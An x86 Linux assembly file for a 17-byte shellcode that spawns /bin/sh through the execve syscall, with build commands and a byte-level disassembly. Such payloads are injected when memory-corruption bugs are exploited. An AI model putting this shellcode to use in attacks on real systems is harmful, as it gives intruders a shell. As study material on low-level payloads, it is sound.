; To compile:
;
;	nasm -f elf32 smallest_shell.s
;	ld -m elf_i386 smallest_shell.o

section .text
    global _start

_start:
    push    0xb
    pop     eax
    push    0x0068732f
    push    0x6e69622f
    mov     ebx, esp
    int     0x80


;0:  6a 0b                   push   0xb
;2:  58                      pop    eax
;3:  68 2f 73 68 00          push   0x68732f
;8:  68 2f 62 69 6e          push   0x6e69622f
;d:  89 e3                   mov    ebx,esp
;f:  cd 80                   int    0x80
; 17 bytes
